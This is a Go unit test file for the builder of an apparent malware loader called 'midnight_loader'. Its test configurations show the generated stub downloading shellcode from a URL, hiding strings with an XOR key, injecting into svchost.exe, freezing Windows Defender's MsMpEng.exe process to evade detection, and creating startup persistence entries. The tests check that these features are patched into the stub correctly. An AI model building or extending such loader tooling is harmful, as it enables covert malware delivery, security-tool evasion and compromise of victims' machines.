package builder_test

import (
	"os"
	"strings"
	"testing"

	"midnight_loader/internal/builder"
	"midnight_loader/internal/config"
)

func TestPatchStubInjectsXorKey(t *testing.T) {
	dir := t.TempDir()
	cfg := config.BuildConfig{
		ShellcodeURL:     "http://example.com/payload.bin",
		XorKey:           "testkey12345",
		InjectionTarget:  "C:\\\\Windows\\\\System32\\\\svchost.exe",
		EDRProcessName:   "",
		FreezeTimeMs:     0,
		StartupEntryName: "myentry",
		DirectoryName:    "mydir",
		FileName:         "myfile",
	}
	outPath, err := builder.PatchStub(cfg, dir)
	if err != nil {
		t.Fatalf("PatchStub: %v", err)
	}
	data, _ := os.ReadFile(outPath)
	src := string(data)
	if !strings.Contains(src, `OBF("testkey12345")`) {
		t.Error("expected XOR key in patched stub")
	}
	if strings.Contains(src, "FreezeEDR") {
		t.Error("FreezeEDR call must be absent when EDRProcessName is empty")
	}
	if strings.Contains(src, `#include "EDRFreeze.h"`) {
		t.Error("EDRFreeze.h include must be absent when EDRProcessName is empty")
	}
}

func TestPatchStubWithEDR(t *testing.T) {
	dir := t.TempDir()
	cfg := config.BuildConfig{
		ShellcodeURL:     "http://example.com/payload.bin",
		XorKey:           "testkey12345",
		InjectionTarget:  "C:\\\\Windows\\\\System32\\\\svchost.exe",
		EDRProcessName:   "MsMpEng.exe",
		FreezeTimeMs:     2000,
		StartupEntryName: "myentry",
		DirectoryName:    "mydir",
		FileName:         "myfile",
	}
	outPath, err := builder.PatchStub(cfg, dir)
	if err != nil {
		t.Fatalf("PatchStub: %v", err)
	}
	data, _ := os.ReadFile(outPath)
	src := string(data)
	if !strings.Contains(src, `#include "EDRFreeze.h"`) {
		t.Error("expected EDRFreeze.h include in patched stub")
	}
	if !strings.Contains(src, `FreezeEDR(L"MsMpEng.exe", 2000)`) {
		t.Error("expected FreezeEDR call with correct args")
	}
}

func TestPatchStubWritesObfusHeader(t *testing.T) {
	dir := t.TempDir()
	cfg := config.BuildConfig{
		ShellcodeURL:    "http://example.com/payload.bin",
		XorKey:          "key",
		InjectionTarget: "C:\\\\Windows\\\\System32\\\\notepad.exe",
	}
	_, err := builder.PatchStub(cfg, dir)
	if err != nil {
		t.Fatalf("PatchStub: %v", err)
	}
	if _, err := os.Stat(dir + "/obfusheader.h"); os.IsNotExist(err) {
		t.Error("obfusheader.h should be written to outDir")
	}
}
